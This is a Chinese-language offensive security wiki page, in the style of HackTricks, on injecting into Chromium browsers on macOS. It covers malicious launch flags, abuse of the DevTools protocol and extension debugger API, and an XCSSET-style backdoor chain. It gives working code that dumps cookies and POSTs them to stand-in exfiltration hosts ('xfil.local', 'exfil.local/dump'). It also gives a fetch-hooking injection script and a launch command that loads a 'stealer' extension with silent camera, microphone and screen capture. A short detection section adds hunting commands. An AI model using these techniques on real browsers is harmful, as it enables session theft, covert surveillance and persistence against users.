# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本信息

基于 Chromium 的浏览器，例如 Google Chrome、Microsoft Edge、Brave、Arc、Vivaldi 和 Opera，都使用相同的命令行开关、偏好设置文件和 DevTools 自动化接口。在 macOS 上，任何拥有 GUI 访问权限的用户都可以终止现有浏览器会话，并使用任意 flags、扩展或 DevTools endpoints 重新启动浏览器，而这些组件会以目标用户的 entitlements 运行。

#### 在 macOS 上使用自定义 flags 启动 Chromium

macOS 为每个 Chromium profile 保持单个 UI 实例，因此 instrumentation 通常需要强制关闭浏览器（例如使用 `osascript -e 'tell application "Google Chrome" to quit'`）。攻击者通常通过 `open -na "Google Chrome" --args <flags>` 重新启动浏览器，从而无需修改 app bundle 即可注入参数。将该命令封装到用户 LaunchAgent（`~/Library/LaunchAgents/*.plist`）或 login hook 中，可以确保被篡改的浏览器在重启或注销后重新启动。

#### `--load-extension` Flag

`--load-extension` flag 会自动加载 unpacked extensions（以逗号分隔的路径）。将其与 `--disable-extensions-except` 配合使用，可以阻止合法 extensions，同时强制仅运行你的 payload。恶意 extensions 可以请求 `debugger`、`webRequest` 和 `cookies` 等高影响权限，以便转入 DevTools protocols、修改 CSP headers、降级 HTTPS，或在浏览器启动后立即 exfiltrate session material。

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

这些 switches 会通过 TCP 或 pipe 暴露 Chrome DevTools Protocol (CDP)，使外部工具能够驱动浏览器。Google 观察到该接口被 infostealer 广泛滥用，并从 Chrome 136（2025 年 3 月）开始，除非浏览器使用非标准的 `--user-data-dir` 启动，否则这些 switches 会被 default profile 忽略。这会在真实 profiles 上强制启用 App-Bound Encryption，但攻击者仍然可以生成一个 fresh profile，诱骗受害者在其中进行 authentication（phishing/triage assistance），并通过 CDP 获取 cookies、tokens、device trust states 或 WebAuthn registrations。<sup>[5]</sup>

#### `--user-data-dir` Flag

该 flag 会将整个 browser profile（History、Cookies、Login Data、Preference files 等）重定向到攻击者控制的路径。在现代 Chrome builds 中与 `--remote-debugging-port` 组合使用时，这是 mandatory 的；它还可以保持被篡改的 profile 隔离，使你能够放置预填充的 `Preferences` 或 `Secure Preferences` 文件，以禁用 security prompts、自动安装 extensions 并修改默认 schemes。

#### `--use-fake-ui-for-media-stream` Flag

该 switch 会绕过 camera/mic permission prompt，使调用 `getUserMedia` 的任何页面立即获得访问权限。将其与 `--auto-select-desktop-capture-source="Entire Screen"`、`--kiosk` 等 flags，或 CDP `Browser.grantPermissions` commands 结合使用，可以在不与用户交互的情况下静默 capture audio/video、共享桌面，或满足 WebRTC permission checks。

## 现实中发现的 Delivery 与 Relaunch 模式

CDP abuse 通常是 **post-exploitation** 阶段，而不是初始 payload。近期一场针对 macOS developer 的 campaign 使用了被投毒的 Xcode **`Run Script` build phase**（`PBXShellScriptBuildPhase`），使代码仅在受害者 **build** project 时执行，而不是在其仅 clone 或 open project 时执行。首次执行后，malware 还会感染其他 `.xcodeproj` trees，添加恶意 Git `pre-commit` hooks，并在 ZIP archives 中搜索更多 Xcode projects。<sup>[3]</sup>

对于 Chromium abuse，这一点很重要，因为攻击者无需直接 patch browser binary。一个短生命周期的 build-phase / `osascript` stager 可以改为安装一个 **browser wrapper**（LaunchAgent、login item、Dock entry、trojanized app launcher 等），每当用户启动合法浏览器时，都使用攻击者控制的 flags 重新打开它。<sup>[3]</sup>

> [!TIP]
> 在 developer endpoints 上，检查 `.pbxproj` files、`.git/hooks/pre-commit` 和包含 `.xcodeproj` 的 ZIPs，查找异常的 `curl`、`osascript`、`xxd`、嵌套 `base64` 或 Chrome relaunch logic。

## Remote Debugging 与 DevTools Protocol Abuse

当 Chrome 使用专用的 `--user-data-dir` 和 `--remote-debugging-port` 重新启动后，你可以通过 CDP 连接（例如使用 `chrome-remote-interface`、`puppeteer` 或 `playwright`），并 script 高权限 workflows：

- **Cookie/session theft：** `Network.getAllCookies` 和 `Storage.getCookies` 会返回 HttpOnly values，即使 App-Bound encryption 通常会阻止 filesystem access，因为 CDP 会要求运行中的 browser 对其进行 decrypt。
- **Permission tampering：** `Browser.grantPermissions` 和 `Emulation.setGeolocationOverride` 可以绕过 camera/mic prompts（尤其是在与 `--use-fake-ui-for-media-stream` 组合使用时），或伪造基于 location 的 security checks。
- **Keystroke/script injection：** `Runtime.evaluate` 会在 active tab 中执行任意 JavaScript，从而实现 credential lifting、DOM patching，或注入能够跨 navigation 持续存在的 persistence beacons。<sup>[1]</sup>
- **Live exfiltration：** `Network.webRequestWillBeSentExtraInfo` 和 `Fetch.enable` 可以实时拦截 authenticated requests/responses，而无需接触磁盘 artifacts。
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
由于 Chrome 136 会在默认 profile 上阻止 CDP，将受害者现有的 `~/Library/Application Support/Google/Chrome` 目录复制到 staging 路径不再能够获得解密后的 cookies。相反，可以通过 social-engineer 诱导用户在受 instrumented 的 profile 中进行身份验证（例如“热心”的支持会话），或者通过 CDP 控制的 network hooks 捕获传输中的 MFA tokens。<sup>[5]</sup>

### XCSSET-style CDP Backdoor Chain

一种实用的 malware 模式是：

1. 每次 Chrome 启动时，重新启动 userland implant 或 wrapper。
2. 使用 `--remote-debugging-port=<port>` 启动合法 browser；在 Chrome 136 及更高版本中，通常还需要配合非默认的 `--user-data-dir=<dir>`。
3. 启动一个 helper，连接本地 CDP WebSocket，并使用 `Page.addScriptToEvaluateOnNewDocument` 注册 pre-document hook。<sup>[2]</sup>

该 helper 可以在 site code 运行**之前**注入 JavaScript，非常适合 hook `window.fetch`、`XMLHttpRequest`、wallet providers 或 autofill flows，而无需修改磁盘上的文件。<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
更强的变体会将 browser 变成 **host command bridge**：注入的 JavaScript 输出带有分隔符标记的 `console.log`，本地 helper 监听 `Runtime.consoleAPICalled`，移除标记后，通过 host shell 执行剩余内容（例如 Go 的 `exec.Command`），并通过攻击者的 WebSocket 返回 stdout/stderr。这会将 tab 级别的 script execution 提升为基本无文件的 reverse shell。<sup>[3]</sup>

## 基于 Extension 的 Injection via Debugger API

2023 年的 "Chrowned by an Extension" research 证明，使用 `chrome.debugger` API 的 malicious extension 可以附加到任意 tab，并获得与 `--remote-debugging-port` 相同的 DevTools 权限。<sup>[6]</sup>这打破了原有的 isolation assumptions（extensions 保持在自身 context 中），并支持：

- 使用 `Network.getAllCookies`/`Fetch.getResponseBody` 静默窃取 cookie 和 credentials。
- 修改 site permissions（camera、microphone、geolocation）并绕过 security interstitial，使 phishing pages 能够冒充 Chrome dialogs。
- 通过编程方式驱动 `Page.handleJavaScriptDialog`、`Page.setDownloadBehavior` 或 `Security.handleCertificateError`，篡改 TLS warnings、downloads 或 WebAuthn prompts。

使用 `--load-extension`/`--disable-extensions-except` 加载 extension，这样无需用户交互。一个 weaponizes 此 API 的最小 background script 如下：
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
该 extension 还可以订阅 `Debugger.paused` events，以读取 JavaScript 变量、patch inline scripts，或添加能够在导航后继续存在的 custom breakpoints。由于所有操作都在用户的 GUI session 内运行，因此不会触发 Gatekeeper 和 TCC，这使该 technique 非常适合已经在用户 context 下获得执行权限的 malware。<sup>[6]</sup>

## Detection & Hunting

- 对使用 `--remote-debugging-port`、`--remote-debugging-pipe` 或可疑 `--user-data-dir` 启动的 Chromium browsers 发出 alert，尤其是在 parent 为 `bash`、`sh`、`osascript`、`xcodebuild` 或 LaunchAgent helper 时。
- 查找这类短链：helper 打开本地 CDP WebSocket，注册 `Page.addScriptToEvaluateOnNewDocument`，随后建立长期存在的 outbound WebSocket/HTTPS connection。
- 通过将 browser 的 `Runtime.consoleAPICalled` activity 与执行 attacker-supplied commands 的 child shells 或 helper processes 关联，搜寻 console-to-shell bridges。
- 在 developer Macs 上，检查 `.pbxproj` 中的 `PBXShellScriptBuildPhase` entries、Git `pre-commit` hooks、Dock/login item relaunchers，以及 ZIP-contained Xcode projects 中是否存在 browser wrapper installation。
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### 工具

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - 使用 payload extensions 自动启动 Chromium，并暴露交互式 CDP hooks。
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - 类似的工具，专注于流量拦截和面向 macOS operators 的 browser instrumentation。
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js 库，用于在 `--remote-debugging-port` 实例运行后，通过脚本获取 Chrome DevTools Protocol dumps（cookies、DOM、permissions）。

### 示例
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
在 tools 链接中查找更多示例。

## 参考资料

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [Xcode Assassin 回归：深入分析最新版本的 XCSSET - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [X 上的 Ron Masas (@RonMasas)](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [改进安全性的远程 debugging switches 变更 - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [被 Extension 加冕：通过 Debugger API 滥用 Chrome DevTools Protocol（arXiv:2305.11506）](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
